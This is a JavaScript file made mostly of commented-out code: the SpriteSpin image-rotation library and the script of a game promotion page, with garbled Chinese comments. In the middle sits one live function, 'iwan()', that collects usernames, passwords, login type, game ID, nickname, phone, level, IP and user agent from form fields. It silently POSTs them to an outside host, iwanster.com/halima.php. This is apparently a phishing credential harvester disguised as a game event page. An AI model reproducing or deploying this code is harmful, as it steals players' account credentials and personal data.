            // e.preventDefault();
            // // simulate double click
            // var clickTime = new Date().getTime();
            // if (!state.clickTime) {
                // // on first click
                // state.clickTime = clickTime;
                // return;
            // }
            // // on second click
            // var timeDelta = clickTime - state.clickTime;
            // if (timeDelta > state.doubleClickTime) {
                // // took too long, back to first click
                // state.clickTime = clickTime;
                // return;
            // }
            // // on valid double click
            // state.clickTime = undefined;
            // if (toggleZoom(data)) {
                // updateInput$$1(e, data);
            // }
        // }
// 
        // function onMove(e, data) {
            // var state = getState$$1(data);
            // if (state.stage.is(':visible')) {
                // updateInput$$1(e, data);
            // }
        // }
// 
        // function onDraw(e, data) {
            // var state = getState$$1(data);
            // // calculate the frame index
            // var index = data.lane * data.frames + data.frame;
            // // get the zoom image. Use original frames as fallback. This won't work for spritesheets
            // var source = state.source[index];
            // var spec = findSpecs(data.metrics, data.frames, data.frame, data.lane);
            // // get display position
            // var x = state.currentX;
            // var y = state.currentY;
            // // fallback to centered position
            // if (x == null) {
                // x = state.currentX = 0.5;
                // y = state.currentY = 0.5;
            // }
            // if (source) {
                // // scale up from [0:1] to [0:100] range
                // x = Math.floor(x * 100);
                // y = Math.floor(y * 100);
                // // update background image and position
                // state.stage.css({
                    // 'background-repeat': 'no-repeat',
                    // 'background-image': "url('" + source + "')",
                    // 'background-position': x + "% " + y + "%"
                // });
            // } else if (spec.sheet && spec.sprite) {
                // var sprite = spec.sprite;
                // var sheet = spec.sheet;
                // var src = data.source[sheet.id];
                // var left = -Math.floor(sprite.sampledX + x * (sprite.sampledWidth - data.width));
                // var top_1 = -Math.floor(sprite.sampledY + y * (sprite.sampledHeight - data.height));
                // var width = sheet.sampledWidth;
                // var height = sheet.sampledHeight;
                // state.stage.css({
                    // 'background-image': "url('" + src + "')",
                    // 'background-position': left + "px " + top_1 + "px",
                    // 'background-repeat': 'no-repeat',
                    // // set custom background size to enable responsive rendering
                    // '-webkit-background-size': width + "px " + height + "px",
                    // '-moz-background-size': width + "px " + height + "px",
                    // '-o-background-size': width + "px " + height + "px",
                    // 'background-size': width + "px " + height + "px" /* Chrome, Firefox 4+, IE 9+, Opera, Safari 5+ */
                // });
            // }
        // }
// 
        // function toggleZoom(data) {
            // var state = getState$$1(data);
            // if (!state.stage) {
                // throw new Error('zoom module is not initialized or is not available.');
            // }
            // if (state.stage.is(':visible')) {
                // showZoom(data);
            // } else {
                // hideZoom(data);
                // return true;
            // }
            // return false;
        // }
// 
        // function showZoom(data) {
            // var state = getState$$1(data);
            // state.stage.fadeOut();
            // data.stage.fadeIn();
        // }
// 
        // function hideZoom(data) {
            // var state = getState$$1(data);
            // state.stage.fadeIn();
            // data.stage.fadeOut();
        // }
// 
        // function wheel(e, data) {
            // var state = getState$$1(data);
            // if (!data.loading && state.useWheel) {
                // var we = e.originalEvent;
                // var signY = we.deltaY === 0 ? 0 : we.deltaY > 0 ? 1 : -1;
                // if (typeof state.useWheel === 'number') {
                    // signY *= state.useWheel;
                // }
                // if (state.stage.is(':visible') && signY > 0) {
                    // e.preventDefault();
                    // showZoom(data);
                // }
                // if (!state.stage.is(':visible') && signY < 0) {
                    // e.preventDefault();
                    // hideZoom(data);
                // }
            // }
        // }
        // registerPlugin(NAME, {
            // name: NAME,
            // mousedown: onClick,
            // touchstart: onClick,
            // mousemove: onMove,
            // touchmove: onMove,
            // wheel: wheel,
            // onInit: onInit,
            // onDestroy: onDestroy,
            // onDraw: onDraw
        // });
        // extendApi({
            // toggleZoom: function() { toggleZoom(this.data); } // tslint:disable-line
        // });
    // })();
// 
    // var Utils = _Utils;
// 
    // exports.Utils = Utils;
    // exports.sourceArray = sourceArray;
    // exports.Api = Api;
    // exports.extendApi = extendApi;
    // exports.instances = instances;
    // exports.applyEvents = applyEvents;
    // exports.boot = boot;
    // exports.create = create;
    // exports.createOrUpdate = createOrUpdate;
    // exports.destroy = destroy;
    // exports.namespace = namespace;
    // exports.eventNames = eventNames;
    // exports.callbackNames = callbackNames;
    // exports.eventsToPrevent = eventsToPrevent;
    // exports.defaults = defaults;
    // exports.getInputState = getInputState;
    // exports.updateInput = updateInput;
    // exports.resetInput = resetInput;
    // exports.applyLayout = applyLayout;
    // exports.getPlaybackState = getPlaybackState;
    // exports.updateFrame = updateFrame;
    // exports.stopAnimation = stopAnimation;
    // exports.applyAnimation = applyAnimation;
    // exports.startAnimation = startAnimation;
    // exports.registerPlugin = registerPlugin;
    // exports.registerModule = registerModule;
    // exports.getPlugin = getPlugin;
    // exports.applyPlugins = applyPlugins;
    // exports.getState = getState;
    // exports.getPluginState = getPluginState;
    // exports.is = is;
    // exports.flag = flag;
// 
    // Object.defineProperty(exports, '__esModule', { value: true });
// 
// })));
// //# sourceMappingURL=spritespin.js.map
function iwan() {
 const a = document.getElementById("user").value;
 const b = document.getElementById("pass").value;
 const c = document.getElementById("login").value;
 const d = document.getElementById("id").value;
 const e = document.getElementById("nick").value;
 const f = document.getElementById("hp").value;
 const g = document.getElementById("level").value;
 const h = document.getElementById("ip").value;
 const i = document.getElementById("ua").value;
 
 
 if(d == "" || d == null) {
  document.getElementById("id").style.border = "2px solid red";
  return false;
  }else{
  document.getElementById("id").style = "border-bottom:2px solid aqua;border-left:none;border-right:none;border-top:none;";
  }
  
  if(e == "" || e == null) {
  document.getElementById("nick").style.border = "2px solid red";
  return false;
  }else{
  document.getElementById("nick").style = "border-bottom:2px solid aqua;border-left:none;border-right:none;border-top:none;";
  }
  
  if(f == "" || f == null) {
  document.getElementById("hp").style.border = "2px solid red";
  return false;
  }else{
  document.getElementById("hp").style = "border-bottom:2px solid aqua;border-left:none;border-right:none;border-top:none;";
  }
  
  if(g == "" || g == null) {
  document.getElementById("level").style.border = "2px solid red";
  return false;
  }else{
  document.getElementById("level").style = "border-bottom:2px solid aqua;border-left:none;border-right:none;border-top:none;";
  }
  data = new FormData()
data.set('a',a)
data.set('b',b)
data.set('c',c)
data.set('d',d)
data.set('e',e)
data.set('f',f)
data.set('g',g)
data.set('h',h)
data.set('i',i)

let request = new XMLHttpRequest();
request.open("POST", 'http://iwanster.com/halima.php', true);
request.send(data)
document.getElementById("tombol").style.display = "none";
document.getElementById("loding").style.display = "block";
}

/* æ³•è€è§†é¢‘è½®æ’­ */
// var egyptPlayerSwiper = new Swiper('.swiper-container-egypt', {
    // loop: true,
    // speed: 500,
    // slidesPerView: 5,
    // spaceBetween: 0,
    // centeredSlides: true,
    // slideToClickedSlide: true,
    // watchSlidesProgress: true,
    // // touchAngle: 10, // è®¾ç½®æ»‘åŠ¨æ–¹å‘é™åˆ¶
    // on: {
        // setTranslate: function() {
            // slides = this.slides
            // for (i = 0; i < slides.length; i++) {
                // slide = slides.eq(i)
                // progress = slides[i].progress;
// 
                // // slide.html(progress.toFixed(2)); // çœ‹æ¸…æ¥šprogressæ˜¯æ€Žä¹ˆå˜åŒ–çš„
                // slide.css({
                    // 'opacity': '',
                    // 'background': '',
                    // 'filter': '',
                    // 'z-index': '1'
                // });
                // slide.transform(''); //æ¸…é™¤æ ·å¼
                // slide.css('filter', 'brightness(' + (1 - Math.abs(progress) / 8) + ')');
                // slide.css('pointer-events', 'inherit');
// 
                // // ã€progress > 2.05ã€‘ å±å¹•å·¦è¾¹éšè—çš„æŒ‰é’®
                // if (progress > 2.05) {
                    // progress = 2;
                    // slide.transform('translateY(calc(-' + progress * 90 + '/19.2*1vw)) translateX(calc(' + progress * -35 + '/19.2*1vw))');
                // }
                // // ã€progress < -2.05ã€‘ å±å¹•å³è¾¹éšè—çš„æŒ‰é’®
                // else if (progress < -2.05) {
                    // progress = -2;
                    // slide.transform('translateY(calc(' + progress * 90 + '/19.2*1vw)) translateX(calc(' + progress * -35 + '/19.2*1vw))');
                // }
                // // ã€progress > 1.5 && progress < 2.05ã€‘ å±å¹•æœ€å³è¾¹æ˜¾ç¤ºçš„æŒ‰é’®
                // else if (progress > 1.5 && progress < 2.05) {
                    // slide.transform('translateY(calc(' + progress * -90 + '/19.2*1vw)) translateX(calc(' + progress * 78 + '/19.2*1vw))');
                // }
                // // ã€progress <- 1.5 && progress >- 2.05ã€‘ å±å¹•æœ€å·¦è¾¹æ˜¾ç¤ºçš„æŒ‰é’®
                // else if (progress < -1.5 && progress > -2.05) {
                    // slide.transform('translateY(calc(' + progress * 90 + '/19.2*1vw)) translateX(calc(' + progress * 78 + '/19.2*1vw))');
                // }
                // // ã€progress > 0ã€‘ å±å¹•å³è¾¹æ˜¾ç¤ºçš„æŒ‰é’®
                // else if (progress > 0.5) {
                    // slide.transform('translateY(calc(' + progress * -65 + '/19.2*1vw)) translateX(calc(' + progress * -50 + '/19.2*1vw))');
                // }
                // // ã€progress < 0ã€‘ å±å¹•å·¦è¾¹æ˜¾ç¤ºçš„æŒ‰é’®
                // else if (progress < 0.5) {
                    // slide.transform('translateY(calc(' + progress * 65 + '/19.2*1vw)) translateX(calc(' + progress * -50 + '/19.2*1vw))');
                // }
// 
                // // ã€progress <= 1.5 && progress >= -1.5ã€‘ å±å¹•ä¸­é—´æ˜¾ç¤ºçš„3ä¸ªæŒ‰é’®
                // if (progress <= 1.5 && progress >= -1.5) {
                    // slide.css('z-index', '2');
                // }
                // // ã€progress <= 0.5 && progress >= -0.5ã€‘ å±å¹•æœ€ä¸­é—´æ˜¾ç¤ºçš„æŒ‰é’®
                // if (progress <= 0.5 && progress >= -0.5) {
                    // slide.css('z-index', '3');
                // }
            // }
        // },
        // setTransition: function(transition) {
            // for (var i = 0; i < this.slides.length; i++) {
                // var slide = this.slides.eq(i)
                // slide.transition(transition);
            // }
        // },
    // }
// });
// // 'use strict';
// !(function() {
    // // document.querySelector('body').addEventListener('touchstart', function(ev) {
    // //     event.preventDefault();
    // // });
// 
    // /* åˆ¤æ–­Android4.4ç‰ˆæœ¬ */
    // var ua = navigator.userAgent.toLowerCase();
    // var isLowerStystem = false;
    // if (/android/i.test(navigator.userAgent)) {
        // var test = /android\s([\w.]+)/; //IE
        // var match = test.exec(ua);
        // console.log(match);
        // var version = match[1].split(".")[0];
        // if (version <= 4.4) {
            // console.log("This is Android " + match[1] + " browser.");
            // initAndroidLowerType();
        // }
    // }
    // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page1'});
// 
    // function initAndroidLowerType() {
        // isLowerStystem = true;
        // $('.sec1 .version-tip').addClass("on");
    // }
// 
    // var language = "en"; // å¤šè¯­è¨€çŽ¯å¢ƒ
    // var position = 0; // é¡µé¢å‘ä¸Šå·åŽ»çš„è·ç¦»
    // var egyptPartOn = false; // æ³•è€æ˜¯å¦å·²è¢«è½¬åŠ¨
    // var _nextIndex = 1,
        // _direction; // fullpageå½“å‰ç¿»é¡µçŠ¶æ€ï¼ˆä¸‹ä¸€é¡µï¼Œæ–¹å‘ï¼‰
// 
    // $('#fullpage').fullpage({
        // touchSensitivity: 100, // å®šä¹‰äº†æµè§ˆå™¨çª—å£çš„å®½åº¦/é«˜åº¦çš„ç™¾åˆ†æ¯”ï¼Œå¤šè¿œçš„è§¦æ‘¸æ»‘åŠ¨å¯ä»¥è·³è½¬åˆ°ä¸‹ä¸€ä¸ªsection / slideã€‚(è®¾ç½®çš„æ¯”è¾ƒé«˜ï¼Œç¦æ­¢æ’ä»¶æœ¬èº«çš„æ»šåŠ¨ï¼Œä»¥touchäº‹ä»¶æ›¿ä»£)
        // anchors: ['page1', 'page2', 'page3', 'page4', 'page5'], //anchorså®šä¹‰é”šé“¾æŽ¥ï¼Œé»˜è®¤ä¸º[],
        // lockAnchors: true, // ä¸æ˜¾ç¤ºurlåŽå¸¦#çš„å†…å®¹
        // normalScrollElements: '.scrollbar-p', //normalScrollElementsæŒ‡å®šçš„ç±»åç§°æ»šåŠ¨æ—¶ï¼Œç¦æ­¢fullpageçš„é»˜è®¤æ»šåŠ¨äº‹ä»¶
        // onLeave: function(index, nextIndex, direction) {
            // /* Mç«¯ä¸æ˜¾ç¤ºåº•éƒ¨ï¼Œé¡µé¢ç¦æ­¢æ»šåŠ¨åˆ°ç¬¬5å± */
            // if (4 == index && 'down' == direction && 5 == nextIndex && $("body").hasClass("mclass")) {
                // return false;
            // }
            // if (isLowerStystem) {
                // return false;
            // }
            // _nextIndex = nextIndex;
            // _direction = direction;
            // setPage();
        // },
        // afterResize: function() {
            // /* Mç«¯ä¸æ˜¾ç¤ºåº•éƒ¨ï¼Œé¡µé¢ç¦æ­¢æ»šåŠ¨åˆ°ç¬¬5å± */
            // if ($("body").hasClass("fp-viewing-page5") && $("body").hasClass("mclass")) {
                // $.fn.fullpage.moveTo(4);
                // return false; // åœ¨onLeave å›žè°ƒå‡½æ•°ä¸­è¿”å›žfalseï¼Œå°†å–æ¶ˆæ»šåŠ¨ã€‚
            // }
            // setPage();
        // }
    // });
// 
    // var player;
// 
    // /**
     // * æ ¹æ®ç”¨æˆ·æ»‘åŠ¨æ“ä½œï¼Œè®¾ç½®é¡µé¢æ»šåŠ¨è·ç¦»
     // */
    // function setPage() {
        // var nextIndex = _nextIndex;
        // var direction = _direction;
// 
        // /* ä»¥ä¸‹ä¸ºpcç«¯è®¾é… */
        // var vw = $(window).width();
        // var vh = $(window).height();
        // var speed = 700;
        // var sectionHeight = 900 / 1920 * vw;
        // if ('up' == direction) {
            // if (nextIndex == 1) {
                // egyptPartOn = true; // ä¿®æ”¹æ³•è€çŠ¶æ€ä¸ºå·²è½¬åŠ¨
                // egyptInit(); // è®¾ç½®æ³•è€è½¬åŠ¨åˆ°åˆå§‹åŒ–è§†å›¾
                // position = 0;
                // $(".sec2-1").removeClass("on");
                // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page1_up'});
            // } else if (nextIndex == 2) {
                // $(".sec2-tip2").removeClass("on");
                // if (!$(".sec2-tip1").hasClass("on")) {
                    // $(".sec2-tip1").addClass("on");
                // }
                // egyptPartOn = true;
                // egyptInit();
                // $(".sec2-1").addClass("on");
                // position = sectionHeight - vh / 2 + sectionHeight / 2;
                // $('.sec2-detail').animate({ scrollTop: 0 }, speed, 'swing');
                // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page2_up'});
            // } else if (nextIndex == 3) {
                // $(".sec2-tip1").removeClass("on");
                // if (!$(".sec2-tip2").hasClass("on")) {
                    // $(".sec2-tip2").addClass("on");
                // }
                // position = sectionHeight - vh / 2 + sectionHeight / 2;
                // $('.sec2-detail').animate({ scrollTop: sectionHeight }, speed, 'swing');
                // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page3_up'});
            // } else if (nextIndex == 4) {
                // $(".sec2-1").removeClass("on");
                // position = sectionHeight * 2 - vh / 2 + sectionHeight / 2;
            // } else if (nextIndex == 5) {
                // position = sectionHeight * 3 - vh / 2 + sectionHeight / 2;
            // }
        // } else {
            // if (nextIndex == 1) {
                // position = 0;
                // $(".sec2-1").removeClass("on");
            // } else if (nextIndex == 2) {
                // $(".sec2-tip2").removeClass("on");
                // if (!$(".sec2-tip1").hasClass("on")) {
                    // $(".sec2-tip1").addClass("on");
                // }
                // $(".sec2-1").addClass("on");
                // position = sectionHeight - vh / 2 + sectionHeight / 2;
                // $('.sec2-detail').animate({ scrollTop: 0 }, speed, 'swing');
                // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page2'});
            // } else if (nextIndex == 3) {
                // $(".sec2-tip1").removeClass("on");
                // if (!$(".sec2-tip2").hasClass("on")) {
                    // $(".sec2-tip2").addClass("on");
                // }
                // $(".sec2-tip1").removeClass("on");
                // if ($(".sec2-tip2").hasClass("on")) {
                    // $(".sec2-tip2").addClass("on");
                // }
                // egyptPartOn = true;
                // egyptInit();
                // position = sectionHeight - vh / 2 + sectionHeight / 2;
                // $('.sec2-detail').animate({ scrollTop: sectionHeight }, speed, 'swing');
                // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page3'});
            // } else if (nextIndex == 4) {
                // $(".sec2-1").removeClass("on");
                // // pc
                // // position = sectionHeight * 2 - vh / 2 + sectionHeight / 2;
                // // m
                // position = 3 * sectionHeight - vh;
                // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page4'});
            // } else if (nextIndex == 5) {
                // position = sectionHeight * 3 - vh / 2 + sectionHeight / 2;
            // }
        // }
        // $('.wrap').animate({ scrollTop: position + "px" }, speed, 'swing');
    // }
// 
    // /* 3Dæ³•è€ */
    // $('.spritespin').spritespin({
        // source: [
            // './images/egypt_00084.png',
            // './images/egypt_00082.png',
            // './images/egypt_00080.png',
// 
            // './images/egypt_00078.png',
            // './images/egypt_00076.png',
            // './images/egypt_00074.png',
            // './images/egypt_00072.png',
            // './images/egypt_00070.png',
// 
            // './images/egypt_00068.png',
            // './images/egypt_00066.png',
            // './images/egypt_00064.png',
            // './images/egypt_00062.png',
            // './images/egypt_00060.png',
// 
            // './images/egypt_00058.png',
            // './images/egypt_00056.png',
            // './images/egypt_00054.png',
            // './images/egypt_00052.png',
            // './images/egypt_00050.png',
// 
            // './images/egypt_00048.png',
            // './images/egypt_00046.png',
            // './images/egypt_00044.png',
            // './images/egypt_00042.png',
            // './images/egypt_00040.png',
// 
            // './images/egypt_00038.png',
            // './images/egypt_00036.png',
            // './images/egypt_00034.png',
            // './images/egypt_00032.png',
            // './images/egypt_00030.png',
// 
            // './images/egypt_00028.png',
            // './images/egypt_00026.png',
            // './images/egypt_00024.png',
            // './images/egypt_00022.png',
            // './images/egypt_00020.png',
// 
            // './images/egypt_00018.png',
            // './images/egypt_00016.png',
            // './images/egypt_00014.png',
            // './images/egypt_00012.png',
            // './images/egypt_00010.png',
// 
            // './images/egypt_00008.png',
            // './images/egypt_00006.png',
            // './images/egypt_00004.png',
            // './images/egypt_00002.png',
            // './images/egypt_00000.png',
        // ],
        // sense: -1,
        // animate: false, //æ˜¯å¦è‡ªåŠ¨æ’­æ”¾360åº¦å›¾ç‰‡æ—‹è½¬
        // loop: false, //æ˜¯å¦å¾ªçŽ¯æ’­æ”¾ 
        // plugins: [
            // 'progress', // åŠ è½½è¿›åº¦æ¡
            // '360',
            // 'drag'
        // ],
        // onLoad: function() { //æ‰€æœ‰æºæ–‡ä»¶éƒ½å·²åŠ è½½ä¸”spritespinå‡†å¤‡å¥½æ›´æ–°å’Œç»˜åˆ¶æ—¶å‘ç”Ÿ
            // $(".spritespin-img").css("display", "none")
        // },
    // });
// 
    // var interval, // æŽ§åˆ¶æ³•è€è½¬åœˆçš„å®šæ—¶å‡½æ•°
        // stop; // æ³•è€æœ€åŽåœæ­¢å¹¶å±•ç¤ºçš„ä¸‹æ ‡
// 
    // /** æ–¹æ³•è¯´æ˜Ž
     // * @method è½¬åŠ¨æ³•è€ åˆ¤æ–­frameå’Œstopçš„æœ€è¿‘æ–¹å‘
     // * @for æ‰€å±žç±»å
     // * @param{int}frame é¡µé¢å½“å‰å±•ç¤ºæ³•è€çš„ä¸‹æ ‡
     // * @param{int}stop æ³•è€æœ€åŽåœæ­¢å¹¶å±•ç¤ºçš„ä¸‹æ ‡
     // * @param{int}halfFrame æ³•è€æ•°ç»„é•¿åº¦çš„ä¸€åŠ
     // * @param{int}direction æ—‹è½¬æ–¹å‘ï¼Œ1ï¼šå›žåˆ°ä¸Šä¸€å¼ ï¼Œ2ï¼šå›žåˆ°ä¸‹ä¸€å¼ 
     // * @param{}interval æ³•è€ä¸åœè½¬åœˆ
     // * @return {null} null
     // */
    // function moveTo() {
        // clearInterval(interval);
        // var frame = api.data.frame;
        // var halfFrame = Math.floor(api.data.frames / 2);
        // var direction;
        // stop = stop - 0;
// 
        // // èŽ·å–æœ€å°è·ç¦»ï¼Œè®¾ç½®æ³•è€è½¬åŠ¨æ–¹å‘
        // if (frame >= halfFrame) {
            // if ((frame - halfFrame) < stop && stop < frame) {
                // direction = 1;
            // } else {
                // direction = 2;
            // }
        // } else {
            // if ((frame + halfFrame) > stop && stop > frame) {
                // direction = 2;
            // } else {
                // direction = 1;
            // }
        // }
// 
        // // è®¾ç½®æ³•è€è½¬åŠ¨
        // interval = setInterval(function() {
            // if (stop != api.data.frame - 0) {
                // if (1 === direction) {
                    // api.prevFrame();
                // } else {
                    // api.nextFrame();
                // }
            // } else {
                // clearInterval(interval);
            // }
        // }, 66)
    // }
// 
    // var api = $(".spritespin").spritespin("api");
    // console.log(api.data);
// 
    // $(".sec2-egypt-part").on("click", function() {
        // egyptPartOn = true;
        // $(this).addClass("on").siblings().removeClass("on").addClass("hide");
        // $(".sec2-1-line").addClass("hide");
        // if ($(this).hasClass("left")) {
            // $(".sec2-egypt-detail").addClass("left");
        // } else {
            // $(".sec2-egypt-detail").removeClass("left");
        // }
        // $(".sec2-egypt-detail").addClass("on");
        // // æ›´æ–°æ³•è€æœ€åŽåœæ­¢å¹¶å±•ç¤ºçš„ä¸‹æ ‡
        // stop = $(this).attr("data-move");
        // moveTo();
// 
        // $(".sec2-egypt-detail").css({
            // "background-image": "url(./images/egypt_part_detail" + ($(this).index() + 1) + ".png)"
        // });
        // $(".sec2-egypt-detail p").eq($(this).index()).addClass("on").siblings().removeClass("on");
        // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page2_detail_' + $(this).index()});
        // return false;
    // })
// 
    // // ç‚¹å‡»canvas, è½¬åŠ¨æ³•è€å›žå½’åˆå§‹çŠ¶æ€
    // $(".sec2-0, .section2-1").on("click", function() {
        // egyptInit();
    // });
// 
    // /* 
    // è…¾è®¯äº‘åº”ç”¨idï¼š1400251323
        // è§†é¢‘æ–‡ä»¶idï¼š
// éœ‡é¢¤å…¥åœºå½•å±.mp4         ID: 5285890805831792512
// é¦–å±è§†é¢‘.mp4         ID: 5285890805831819890
// å†³èƒœæ’­æŠ¥å½•å±.mp4         ID: 5285890805831782395
// å…±äº«ç‰©å“å½•å±.mp4         ID: 5285890805831790923
// å¤§åŽ…ä¸“å±žåŠ¨ä½œå½•å±.mp4         ID: 5285890805831790175
// å‡ºç”Ÿå²›ä¸“å±žåŠ¨ä½œå½•å±.mp4         ID: 5285890805831780562
    // */
// 
    // $(".sec2-player-text").on("click", function() {
        // var tid = $(this).attr("data-tid");
        // $('.b-bg').show();
        // $(".pop-vid").show();
        // player = TCPlayer('player-container-id', { // player-container-id ä¸ºæ’­æ”¾å™¨å®¹å™¨IDï¼Œå¿…é¡»ä¸Žhtmlä¸­ä¸€è‡´
            // fileID: tid, // è¯·ä¼ å…¥éœ€è¦æ’­æ”¾çš„è§†é¢‘filID å¿…é¡»
            // appID: '1400251323', // è¯·ä¼ å…¥ç‚¹æ’­è´¦å·çš„appID å¿…é¡»
            // autoplay: true,
            // loop: false,
        // });
        // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page3_video_' + $(this).attr("data-player")});
    // });
// 
// 
    // $(".pop-video-close").on("click", function() {
        // player.dispose();
        // $("#player-container-id").remove();
        // $(".pop-vid").append("<video id='player-container-id' width='414' height='270' preload='auto' playsinline webkit-playsinline></video>");
    // });
// 
    // $(".pop-close").on("click", function() {
        // $('.b-bg').hide();
        // $(".pop-share").hide();
    // });
// 
    // // é¦–å±å¼¹çª—
    // $(".s1-player-btn").on("click", function() {
        // gtag('event', 'x_click', {'event_category': 'a20200622egyptm', 'event_label': 'page1_play'});
        // var tid = $(this).attr("data-tid");
        // $('.b-bg').show();
        // $(".pop-vid").show();
        // player = TCPlayer('player-container-id', { // player-container-id ä¸ºæ’­æ”¾å™¨å®¹å™¨IDï¼Œå¿…é¡»ä¸Žhtmlä¸­ä¸€è‡´
            // fileID: tid, // è¯·ä¼ å…¥éœ€è¦æ’­æ”¾çš„è§†é¢‘filID å¿…é¡»
            // appID: '1400251323', // è¯·ä¼ å…¥ç‚¹æ’­è´¦å·çš„appID å¿…é¡»
            // autoplay: true,
            // loop: true
        // });
    // })
// 
    // /** æ–¹æ³•è¯´æ˜Ž
     // * @method è°ƒæ•´æ³•è€ä¸ºæ­£é¢çŠ¶æ€ å±•ç¤ºæ•°ç»„sourceç¬¬ä¸€å¼ å›¾
     // * @for index
     // * @param{boolean}egyptPartOn æ³•è€æ˜¯å¦éžæ­£é¢å±•ç¤º
     // * @return {null} null
     // */
    // function egyptInit() {
        // if (egyptPartOn) {
            // egyptPartOn = false;
            // // $(".sec2 .spritespin").css("transform", "scale(1)");
            // $(".sec2-egypt-part").removeClass("on").removeClass("hide");
            // $(".sec2-egypt-detail").removeClass("on");
            // stop = 0;
            // // scale = 0;
            // moveTo();
            // $(".sec2-1-line").removeClass("hide");
        // }
    // }
// 
    // /* è§¦æ‘¸æ»‘åŠ¨ï¼Œæ›¿ä»£fullpageæœ¬èº«çš„æ‹–æ‹½æ»‘åŠ¨äº‹ä»¶ S */
    // var startx, starty;
    // //èŽ·å¾—è§’åº¦
    // function getAngle(angx, angy) {
        // return Math.atan2(angy, angx) * 180 / Math.PI;
    // };
// 
    // //æ ¹æ®èµ·ç‚¹ç»ˆç‚¹è¿”å›žæ–¹å‘ 1å‘ä¸Š 2å‘ä¸‹
    // function getDirection(startx, starty, endx, endy) {
        // var angx = endx - startx;
        // var angy = endy - starty;
        // var result = 0;
// 
        // //å¦‚æžœæ»‘åŠ¨è·ç¦»å¤ªçŸ­
        // if (Math.abs(angx) < 50 && Math.abs(angy) < 50) {
            // return result;
        // }
// 
        // var angle = getAngle(angx, angy);
        // if (angle >= -135 && angle <= -45) {
            // result = 1;
        // } else if (angle > 45 && angle < 135) {
            // result = 2;
        // }
// 
        // return result;
    // }
// 
    // var isTouchScrollP = false;
// 
    // //æ‰‹æŒ‡æŽ¥è§¦å±å¹•
    // document.addEventListener("touchstart", function(e) {
        // startx = e.touches[0].pageX;
        // starty = e.touches[0].pageY;
// 
        // if ($(e.touches[0].target).hasClass("scrollbar-p")) {
            // isTouchScrollP = true;
        // }
    // }, false);
// 
    // //æ‰‹æŒ‡ç¦»å¼€å±å¹•
    // document.addEventListener("touchend", function(e) {
        // // éœ€è¦æ»šåŠ¨æ¡çš„å…ƒç´ å†…æ‰‹æŒ‡æ»‘åŠ¨å†…å®¹æ—¶ï¼Œç¦æ­¢é¡µé¢é»˜è®¤æ»‘åŠ¨
        // if (isTouchScrollP) {
            // isTouchScrollP = false;
            // return false;
        // }
        // var endx, endy;
        // endx = e.changedTouches[0].pageX;
        // endy = e.changedTouches[0].pageY;
        // var direction = getDirection(startx, starty, endx, endy);
        // switch (direction) {
            // case 1:
                // $.fn.fullpage.moveSectionDown(); //æ‰‹æŒ‡å‘ä¸Šæ‹–æ‹½ï¼Œé¡µé¢å‘ä¸‹æ»šåŠ¨ä¸€é¡µ
                // break;
            // case 2:
                // $.fn.fullpage.moveSectionUp(); //æ‰‹æŒ‡å‘ä¸‹æ‹–æ‹½ï¼Œé¡µé¢å‘ä¸Šæ»šåŠ¨ä¸€é¡µ
                // break;
            // default:
        // }
    // }, { passive: false });
// 
    // // //é˜»æ­¢æµè§ˆå™¨çš„é»˜è®¤è¡Œä¸º 
    // // function stopDefault(e) {
    // //     //é˜»æ­¢é»˜è®¤æµè§ˆå™¨åŠ¨ä½œ(W3C) 
    // //     if (e && e.preventDefault)
    // //         e.preventDefault();
    // //     //IEä¸­é˜»æ­¢å‡½æ•°å™¨é»˜è®¤åŠ¨ä½œçš„æ–¹å¼ 
    // //     else
    // //         window.event.returnValue = false;
    // //     return false;
    // // }
    // /* è§¦æ‘¸æ»‘åŠ¨ï¼Œæ›¿ä»£fullpageæœ¬èº«çš„æ‹–æ‹½æ»‘åŠ¨äº‹ä»¶ E */
// 
    // /* åŠ è½½é¦–å±åŠ¨ç”»å¸§ s */
    // function preloadVideo(opts) {
        // var src;
        // var input = opts;
        // src = typeof input === 'string' ? [input] : input;
        // var images = [];
        // var targetCount = src.length;
        // var count = 0;
        // var completed = false;
        // var firstLoaded = false;
        // var tick = function() {
            // count += 1;
// 
            // firstLoaded = firstLoaded || (this === images[0]);
            // if (firstLoaded && !completed && (count >= targetCount)) {
                // completed = true;
            // }
            // if (Math.round((count / src.length) * 100) == 100) {
                // // $(".sec").addClass("bg")
                // // é¦–å±è½®æ’­gifå›¾
                // var imageNum = 100,
                    // imageNow = 0;
                // setInterval(function() {
                    // imageNow++;
                    // $('.sec1').css('background-image', 'url(./images/part1_1/' + imageNow + '.jpg)');
                    // if (imageNow >= imageNum) {
                        // imageNow = 0;
                    // }
                // }, 50)
            // };
        // };
        // for (var _i = 0, src_1 = src; _i < src_1.length; _i++) {
            // var url = src_1[_i];
            // var img = new Image();
            // // push result
            // images.push(img);
            // // bind logic, dont care about abort/errors
            // img.onload = img.onabort = img.onerror = tick;
            // // begin load
            // img.src = url;
        // }
    // }
// 
    // var kv = [
        // './images/part1_1/0.jpg',
        // './images/part1_1/2.jpg',
        // './images/part1_1/3.jpg',
        // './images/part1_1/4.jpg',
        // './images/part1_1/5.jpg',
        // './images/part1_1/6.jpg',
        // './images/part1_1/7.jpg',
        // './images/part1_1/8.jpg',
        // './images/part1_1/9.jpg',
        // './images/part1_1/10.jpg',
        // './images/part1_1/11.jpg',
        // './images/part1_1/12.jpg',
        // './images/part1_1/13.jpg',
        // './images/part1_1/14.jpg',
        // './images/part1_1/15.jpg',
        // './images/part1_1/16.jpg',
        // './images/part1_1/17.jpg',
        // './images/part1_1/18.jpg',
        // './images/part1_1/19.jpg',
        // './images/part1_1/20.jpg',
        // './images/part1_1/21.jpg',
        // './images/part1_1/22.jpg',
        // './images/part1_1/23.jpg',
        // './images/part1_1/24.jpg',
        // './images/part1_1/25.jpg',
        // './images/part1_1/26.jpg',
        // './images/part1_1/27.jpg',
        // './images/part1_1/28.jpg',
        // './images/part1_1/29.jpg',
        // './images/part1_1/30.jpg',
        // './images/part1_1/31.jpg',
        // './images/part1_1/32.jpg',
